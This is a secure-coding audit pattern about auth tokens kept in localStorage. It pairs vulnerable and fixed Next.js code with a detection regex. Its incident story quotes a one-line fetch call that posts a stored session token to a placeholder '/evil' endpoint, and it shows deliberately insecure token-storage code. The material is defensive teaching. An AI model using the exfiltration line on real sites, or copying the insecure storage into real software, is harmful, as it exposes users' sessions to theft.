# Pattern: Auth token stored in localStorage

**Rule:** F1
**Severity:** P1 (P0 if combined with known XSS)
**Seen in:** "quick SPA tutorial" patterns everywhere, plus several SaaS dashboards we've audited.

## Incident story

**2025-09 — mid-size SaaS.** Their dashboard stored a long-lived session JWT in `localStorage.auth_token`. A marketing sub-page imported a customer-service chat widget from a 3rd-party vendor. The vendor's script (loaded via `<script src>`) had a supply-chain XSS. The moment the widget loaded, it ran `fetch('/evil', { method: 'POST', body: localStorage.auth_token })`. Four thousand session tokens exfiltrated in an afternoon.

HttpOnly cookies would have been immune — JavaScript literally can't read them, XSS or not.

## Why localStorage is dangerous

- `localStorage` is readable by any JS running on the same origin.
- A single XSS anywhere on the site — including a 3rd-party script, a badly escaped user comment, a library supply-chain attack — reads every token.
- `localStorage` has no same-site / same-origin nuances beyond the origin itself. One subdomain-wide XSS can be catastrophic.
- Tokens don't expire client-side automatically.

## Bad code

```ts
// login
const { token } = await fetch('/api/login', { method: 'POST', body: ... }).then(r => r.json());
localStorage.setItem('auth_token', token);

// every request
fetch('/api/me', {
  headers: { Authorization: `Bearer ${localStorage.getItem('auth_token')}` },
});
```

Variants — still bad:
- `sessionStorage.setItem('jwt', ...)` (narrower, still XSS-readable)
- IndexedDB (same)
- Writing it to a non-`httpOnly` cookie (JS can still read `document.cookie`)

## Good code

Server sets an `httpOnly`, `secure`, `sameSite=lax` cookie. The browser sends it automatically. JS never touches it.

### Server (Next.js Route Handler)

```ts
import { NextResponse } from 'next/server';
import { signSession } from '@/lib/auth';

export async function POST(req: Request) {
  const { email, password } = await req.json();
  const user = await verify(email, password);
  if (!user) return NextResponse.json({ error: 'bad creds' }, { status: 401 });

  const token = await signSession(user.id, '7d');
  const res = NextResponse.json({ ok: true });
  res.cookies.set('session', token, {
    httpOnly: true,
    secure: true,          // HTTPS only
    sameSite: 'lax',       // send on top-level nav, block cross-site POST
    path: '/',
    maxAge: 60 * 60 * 24 * 7,
  });
  return res;
}
```

### Client

```ts
// No token handling. Cookie sent automatically. `credentials: 'include'` only if cross-origin.
const res = await fetch('/api/me');
const user = await res.json();
```

### Server-side route guard

```ts
// middleware.ts
import { NextRequest, NextResponse } from 'next/server';
import { verifySession } from '@/lib/auth';

export async function middleware(req: NextRequest) {
  const sess = req.cookies.get('session')?.value;
  const user = sess ? await verifySession(sess) : null;
  if (!user) return NextResponse.redirect(new URL('/login', req.url));
  return NextResponse.next();
}
export const config = { matcher: ['/app/:path*', '/api/private/:path*'] };
```

## CSRF — the trade-off

HttpOnly cookies are automatically attached, so `sameSite=lax` matters (or `sameSite=strict` for max safety). For state-changing endpoints, add a CSRF token (double-submit cookie or synchroniser pattern). Next.js server actions already have built-in CSRF protection; for plain Route Handlers called from a different origin, add it manually.

## Detection

`auto_audit.py` flags:

```regex
(localStorage|sessionStorage)\.setItem\(\s*['"][^'"]*(token|jwt|auth|session|apikey|bearer|credential)[^'"]*['"]
```

## Gotchas

- You sometimes see "store refresh token in memory, access token in localStorage" — this is better than nothing but still leaks the access token on XSS. Prefer httpOnly.
- Mobile (Capacitor / React Native) — different story. On iOS/Android, use the platform keychain (`@capacitor/preferences` with encryption, or Keychain directly). `localStorage` in a WebView is still readable by injected JS if you ever render untrusted content.

## References

- OWASP — [HTML5 Security Cheat Sheet: localStorage](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)
- [MDN — Set-Cookie HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly)
- CVE-2019-11358 jQuery prototype pollution → localStorage exfil was part of the impact of several public PoCs.
